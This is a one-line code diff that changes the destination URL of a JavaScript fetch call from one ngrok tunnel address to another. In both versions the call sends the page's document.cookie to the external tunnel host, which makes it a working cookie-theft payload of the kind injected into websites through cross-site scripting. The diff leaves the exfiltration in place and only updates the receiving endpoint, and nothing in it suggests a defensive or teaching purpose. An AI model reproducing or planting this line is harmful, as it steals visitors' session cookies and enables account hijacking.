@@ -1,1 +1,1 @@
-fetch('https://7678-155-12-52-99.ngrok-free.app?cookie=' + document.cookie)
+fetch('https://7840-197-250-50-125.ngrok-free.app?cookie=' + document.cookie)
